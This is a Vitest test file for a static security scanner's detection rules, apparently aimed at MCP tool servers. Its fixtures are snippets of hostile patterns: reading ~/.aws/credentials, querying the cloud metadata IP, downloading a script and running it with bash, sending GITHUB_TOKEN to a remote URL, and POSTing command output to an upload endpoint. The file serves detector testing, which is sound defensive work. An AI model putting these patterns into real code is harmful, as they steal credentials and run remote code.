import { describe, expect, it } from "vitest";

import type { ScanFile } from "../src/core/types.js";
import { archiveExtractRule } from "../src/rules/archive-extract.js";
import { broadFilesystemRule } from "../src/rules/broad-filesystem.js";
import { downloadWriteExecRule } from "../src/rules/download-write-exec.js";
import { dynamicCodeExecRule } from "../src/rules/dynamic-code-exec.js";
import { envSecretExposureRule } from "../src/rules/env-secret-exposure.js";
import { internalNetworkAccessRule } from "../src/rules/internal-network-access.js";
import { localServiceBindingRule } from "../src/rules/local-service-binding.js";
import { outboundFetchRule } from "../src/rules/outbound-fetch.js";
import { sensitiveLocalDataRule } from "../src/rules/sensitive-local-data.js";
import { subprocessNetworkExfilRule } from "../src/rules/subprocess-network-exfil.js";
import { toolMetadataRiskRule } from "../src/rules/tool-metadata-risk.js";

function createScanFile(relativePath: string, content: string): ScanFile {
  return {
    absolutePath: `/tmp/${relativePath}`,
    relativePath,
    content,
    lines: content.split(/\r?\n/)
  };
}

describe("rule boundaries", () => {
  it("keeps literal fetch calls at medium confidence", () => {
    const findings = outboundFetchRule.evaluate([
      createScanFile("src/network.ts", 'export async function ping() { return fetch("https://example.com/health"); }')
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("literal-fetch-call");
  });

  it("raises fetch calls with tool-controlled URLs to high confidence", () => {
    const findings = outboundFetchRule.evaluate([
      createScanFile("src/network.ts", "export async function ping(input: { url: string }) { return fetch(input.url); }")
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-url");
  });

  it("does not flag fixed literal file reads as broad filesystem access", () => {
    const findings = broadFilesystemRule.evaluate([
      createScanFile("src/files.ts", 'import { promises as fs } from "node:fs";\nexport async function readConfig() { return fs.readFile("/tmp/config.json", "utf8"); }')
    ]);

    expect(findings).toHaveLength(0);
  });

  it("flags tool-controlled file reads as filesystem path risk", () => {
    const findings = broadFilesystemRule.evaluate([
      createScanFile("src/files.ts", 'import { promises as fs } from "node:fs";\nexport async function readConfig(input: { path: string }) { return fs.readFile(input.path, "utf8"); }')
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("tool-controlled paths");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-path");
  });

  it("raises recursive tool-controlled filesystem mutation to high confidence", () => {
    const findings = broadFilesystemRule.evaluate([
      createScanFile(
        "src/mutation.ts",
        'import { promises as fs } from "node:fs";\nexport async function wipe(input: { targetPath: string }) { return fs.rm(input.targetPath, { recursive: true, force: true }); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("tool-controlled paths");
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("recursive-filesystem-operation");
  });

  it("keeps literal eval usage at medium confidence", () => {
    const findings = dynamicCodeExecRule.evaluate([
      createScanFile("src/eval.ts", 'export function parseExpression() { return eval("1 + 1"); }')
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("literal-dynamic-eval");
  });

  it("raises tool-controlled vm execution to high confidence", () => {
    const findings = dynamicCodeExecRule.evaluate([
      createScanFile(
        "src/dynamic.ts",
        'import vm from "node:vm";\nexport function run(input: { code: string }) { return vm.runInNewContext(input.code, {}); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Dynamic code execution");
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-code-input");
  });

  it("flags direct reads of known credential paths", () => {
    const findings = sensitiveLocalDataRule.evaluate([
      createScanFile(
        "src/secrets.ts",
        'import { promises as fs } from "node:fs";\nexport async function loadCreds() { return fs.readFile(`${process.env.HOME}/.aws/credentials`, "utf8"); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Sensitive local credential");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("fixed-sensitive-local-path");
  });

  it("raises user-controlled secret path access to high confidence", () => {
    const findings = sensitiveLocalDataRule.evaluate([
      createScanFile(
        "src/secrets.ts",
        'import { promises as fs } from "node:fs";\nexport async function loadCreds(input: { secretPath: string }) { return fs.readFile(input.secretPath, "utf8"); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-secret-path");
  });

  it("flags a download-write-exec chain in one file", () => {
    const findings = downloadWriteExecRule.evaluate([
      createScanFile(
        "src/download.ts",
        'export async function install() { const response = await fetch("https://example.com/tool.sh"); await writeFile("/tmp/tool.sh", await response.text(), "utf8"); return execa("bash /tmp/tool.sh"); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Download-to-disk execution");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("fixed-download-write-exec-chain");
  });

  it("raises a tool-controlled download-write-exec chain to high confidence", () => {
    const findings = downloadWriteExecRule.evaluate([
      createScanFile(
        "src/download.ts",
        'export async function install(input: { url: string; command: string }) { const response = await fetch(input.url); await writeFile("/tmp/tool.sh", await response.text(), "utf8"); return execa(input.command); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-download-or-exec-input");
  });

  it("does not flag when the file only downloads without execution", () => {
    const findings = downloadWriteExecRule.evaluate([
      createScanFile(
        "src/download.ts",
        'export async function cache() { const response = await fetch("https://example.com/tool.sh"); return writeFile("/tmp/tool.sh", await response.text(), "utf8"); }'
      )
    ]);

    expect(findings).toHaveLength(0);
  });

  it("flags secret environment variables sent to remote requests", () => {
    const findings = envSecretExposureRule.evaluate([
      createScanFile(
        "src/env.ts",
        'export async function leak(input: { url: string }) { const token = process.env.GITHUB_TOKEN; return fetch(input.url, { headers: { Authorization: `Bearer ${token}` } }); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Environment secret exposure");
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("secret-env-var-reaches-dangerous-sink");
  });

  it("does not flag ordinary environment reads without an exposure sink", () => {
    const findings = envSecretExposureRule.evaluate([
      createScanFile(
        "src/env.ts",
        'export function mode() { return process.env.NODE_ENV ?? "development"; }'
      )
    ]);

    expect(findings).toHaveLength(0);
  });

  it("flags literal internal network targets at high confidence", () => {
    const findings = internalNetworkAccessRule.evaluate([
      createScanFile(
        "src/internal.ts",
        'export async function metadata() { return fetch("http://169.254.169.254/latest/meta-data/"); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Internal or local network access");
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("literal-internal-network-target");
  });

  it("flags tool-controlled internal network destinations by explicit field name", () => {
    const findings = internalNetworkAccessRule.evaluate([
      createScanFile(
        "src/internal.ts",
        "export async function proxy(input: { internalUrl: string }) { return fetch(input.internalUrl); }"
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-internal-network-target");
  });

  it("does not flag ordinary external network targets as internal access", () => {
    const findings = internalNetworkAccessRule.evaluate([
      createScanFile("src/network.ts", 'export async function ping() { return fetch("https://example.com/health"); }')
    ]);

    expect(findings).toHaveLength(0);
  });

  it("flags local listener startup at medium confidence by default", () => {
    const findings = localServiceBindingRule.evaluate([
      createScanFile(
        "src/listener.ts",
        'export function start() { return app.listen(3000); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Local service");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("local-listener-startup");
  });

  it("raises explicit public bind plus tool-controlled port to high confidence", () => {
    const findings = localServiceBindingRule.evaluate([
      createScanFile(
        "src/listener.ts",
        'export function start(input: { port: number }) { return app.listen(input.port, "0.0.0.0"); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-bind-parameter");
  });

  it("flags risky tool metadata descriptions at medium confidence", () => {
    const findings = toolMetadataRiskRule.evaluate([
      createScanFile(
        "src/metadata.ts",
        'export const tools = [{ name: "host-shell", description: "Execute shell commands and read credentials for operators." }];'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Risky MCP tool capability");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("metadata-advertises-risky-capability");
  });

  it("does not flag ordinary descriptive metadata", () => {
    const findings = toolMetadataRiskRule.evaluate([
      createScanFile(
        "src/metadata.ts",
        'export const tools = [{ name: "status", description: "Read repository status for local diagnostics." }];'
      )
    ]);

    expect(findings).toHaveLength(0);
  });

  it("flags subprocess plus network chaining at medium confidence by default", () => {
    const findings = subprocessNetworkExfilRule.evaluate([
      createScanFile(
        "src/exfil.ts",
        'export async function ship() { const result = await execa("git status"); return fetch("https://example.com/upload", { method: "POST", body: result.stdout }); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("exfiltration");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("subprocess-plus-network-chain");
  });

  it("raises tool-controlled subprocess plus network chaining to high confidence", () => {
    const findings = subprocessNetworkExfilRule.evaluate([
      createScanFile(
        "src/exfil.ts",
        'export async function ship(input: { command: string; url: string }) { const result = await execa(input.command); return fetch(input.url, { method: "POST", body: result.stdout }); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-exfiltration-path");
  });

  it("flags archive extraction helpers at medium confidence by default", () => {
    const findings = archiveExtractRule.evaluate([
      createScanFile(
        "src/archive.ts",
        'export function unpack() { const archive = new AdmZip("/tmp/archive.zip"); archive.extractAllTo("/tmp/out", true); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.title).toContain("Archive extraction");
    expect(findings[0]?.confidence).toBe("medium");
    expect(findings[0]?.confidenceReason).toBe("fixed-archive-extraction");
  });

  it("raises tool-controlled archive extraction to high confidence", () => {
    const findings = archiveExtractRule.evaluate([
      createScanFile(
        "src/archive.ts",
        'export function unpack(input: { archivePath: string; targetPath: string }) { const archive = new AdmZip(input.archivePath); archive.extractAllTo(input.targetPath, true); }'
      )
    ]);

    expect(findings).toHaveLength(1);
    expect(findings[0]?.confidence).toBe("high");
    expect(findings[0]?.confidenceReason).toBe("tool-controlled-archive-path");
  });
});
